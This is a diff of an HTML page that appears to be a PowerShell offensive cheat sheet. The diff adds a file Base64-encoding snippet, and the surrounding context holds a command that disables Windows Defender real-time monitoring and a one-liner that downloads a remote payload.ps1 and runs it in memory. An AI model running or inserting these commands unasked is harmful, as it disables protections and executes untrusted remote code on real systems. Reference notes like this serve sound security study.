@@ -171,10 +171,12 @@
 <p>Disable Windows Defender real-time protection:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Set-MpPreference</span> <span class="n">-DisablerealtimeMonitoring</span> <span class="nv">$true</span>
 </code></pre></div>
-<p>Escape single quote <code>'</code> in single quote <code>'</code> strings:
- ~~~powershell
- 'this is''nt an emergency' # Double the '
- ~~~</p>
+<p>Escape single quote <code>'</code> in single quote <code>'</code> strings:</p>
+<div class="highlight"><pre><span></span><code> <span class="s1">'this is''nt an emergency'</span> <span class="c"># Double the '</span>
+</code></pre></div>
+<p>Base64-encode a file:</p>
+<div class="highlight"><pre><span></span><code><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(&lt;</span><span class="n">file</span> <span class="n">path</span><span class="p">&gt;))</span>
+</code></pre></div>
 <h2 id="remote-file">Remote File</h2>
 <p>Download remote script and execute it in memory:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'https://&lt;remote&gt;/payload.ps1'</span><span class="p">)</span>
